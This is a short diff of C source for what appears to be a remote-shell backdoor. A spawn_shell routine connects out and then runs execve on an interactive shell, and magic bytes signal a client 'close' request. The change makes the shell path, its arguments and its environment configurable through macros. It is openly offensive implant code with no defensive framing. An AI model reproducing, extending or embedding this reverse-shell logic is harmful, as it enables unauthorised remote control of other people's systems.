@@ -9,7 +9,8 @@
 const unsigned char close_magic[] =
     {0xde, 0xad, 0xbe, 0xef, 0xba, 0xbe, 0x00, 0x00};
 
-static const char* const argv[] = {"/bin/sh", "-i", NULL};
+static const char* const argv[] = {TARGET_SHELL, TARGET_ARGV, NULL};
+static const char* const envp[] = {TARGET_ENVP, NULL};
 
 static int
 is_close_request(union client_request* req) {
@@ -75,7 +76,7 @@ spawn_shell(union client_request* req) {
   if (rc < 0)
     goto connect_fail;
 
-  execve(argv[0], argv, NULL);
+  execve(argv[0], argv, envp);
   rc = -1;
 
 connect_fail:
